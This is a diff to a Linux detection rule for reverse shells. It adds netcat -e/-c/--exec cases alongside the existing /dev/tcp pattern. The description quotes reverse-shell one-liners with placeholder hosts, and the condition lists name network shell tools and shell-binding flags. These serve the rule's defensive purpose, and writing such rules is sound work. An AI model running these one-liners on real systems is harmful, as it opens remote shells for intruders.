@@ -7,7 +7,10 @@ description: >
   natively inside the shell with no external network-tool binary invoked.
   This covers the classic `bash -i >&/dev/tcp/HOST/PORT 0>&1` reverse-shell
   one-liner, which is otherwise invisible to keyword matching on external
-  tool names.
+  tool names. Also covers the netcat-family self-contained reverse shell
+  (`nc -e /bin/bash HOST PORT`), where the network tool itself execs a
+  shell via -e/-c/--exec — no separate shell process wraps the invocation,
+  so process.name is nc/ncat rather than sh/bash/dash/zsh.
 enabled: true
 platform:
   - linux
@@ -36,36 +39,57 @@ required_fields:
   - process.command_line
   - host.name
 condition:
-  all:
-    - field: process.name
-      operator: in
-      value:
-        - sh
-        - bash
-        - dash
-        - zsh
-    - field: process.normalized_command
-      operator: contains_any
-      value:
-        - curl
-        - wget
-        - nc
-        - ncat
-        - socat
-        - openssl
-        - "/dev/tcp/"
-        - "/dev/udp/"
-    - field: process.normalized_command
-      operator: contains_any
-      value:
-        - "| bash"
-        - "| sh"
-        - "| /bin/bash"
-        - "| /bin/sh"
-        - "bash -c"
-        - "sh -c"
-        - "bash <"
-        - "sh <"
+  any:
+    - all:
+        - field: process.name
+          operator: in
+          value:
+            - sh
+            - bash
+            - dash
+            - zsh
+        - field: process.normalized_command
+          operator: contains_any
+          value:
+            - curl
+            - wget
+            - nc
+            - ncat
+            - socat
+            - openssl
+            - "/dev/tcp/"
+            - "/dev/udp/"
+        - field: process.normalized_command
+          operator: contains_any
+          value:
+            - "| bash"
+            - "| sh"
+            - "| /bin/bash"
+            - "| /bin/sh"
+            - "bash -c"
+            - "sh -c"
+            - "bash <"
+            - "sh <"
+    - all:
+        - field: process.name
+          operator: in
+          value:
+            - nc
+            - ncat
+            - netcat
+        - field: process.normalized_command
+          operator: contains_any
+          value:
+            - "-e /bin/sh"
+            - "-e /bin/bash"
+            - "-e sh"
+            - "-e bash"
+            - "-c /bin/sh"
+            - "-c /bin/bash"
+            - "-c sh"
+            - "-c bash"
+            - "--exec"
+            - "--sh-exec"
 risk_adjustment:
   increase_if:
     - field: process.normalized_command
@@ -91,6 +115,21 @@ risk_adjustment:
         - "/dev/udp/"
       add_score: 15
       reason: Bash/zsh built-in raw socket redirection is a high-confidence reverse-shell indicator with almost no legitimate use
+    - field: process.normalized_command
+      operator: contains_any
+      value:
+        - "-e /bin/sh"
+        - "-e /bin/bash"
+        - "-e sh"
+        - "-e bash"
+        - "-c /bin/sh"
+        - "-c /bin/bash"
+        - "-c sh"
+        - "-c bash"
+        - "--exec"
+        - "--sh-exec"
+      add_score: 15
+      reason: Netcat-family -e/-c/--exec directly binds a shell to the socket — a high-confidence reverse-shell indicator with almost no legitimate use
     - field: process.normalized_command
       operator: contains_all
       value:
@@ -132,15 +171,20 @@ false_positives:
   - Build scripts using curl or wget
   - System administrator maintenance scripts
   - Rare network health-check one-liners using /dev/tcp to test port reachability (uncommon; verify intent)
+  - Rare authorized remote-support sessions using nc -e (discouraged even by netcat's own docs, which flag -e as a security hole; verify intent)
 investigation_guide: |
   1. Review the full command line and parent process hierarchy.
   2. Determine if the network tool was used to download and execute code (e.g., pipes to shell).
   3. Investigate the reputation of the destination domain or IP address — for
-     /dev/tcp or /dev/udp matches this is the reverse-shell callback target.
+     /dev/tcp, /dev/udp, or nc -e matches this is the reverse-shell callback target.
   4. Check for any dropped files in temporary directories like /tmp or /dev/shm.
   5. Verify the user context and whether this activity is typical for this host.
   6. For /dev/tcp or /dev/udp matches, check whether a systemd service, cron
      job, or other persistence mechanism owns the parent process — this
      pattern is commonly embedded in a service's ExecStart to survive reboots.
+  7. For nc/ncat -e matches, note that the network tool itself is the
+     interpreter-spawning process — there is no separate shell parent to
+     inspect; the -e/-c/--exec target is the shell that was bound to the
+     socket.
 references:
   - https://github.com/elastic/detection-rules
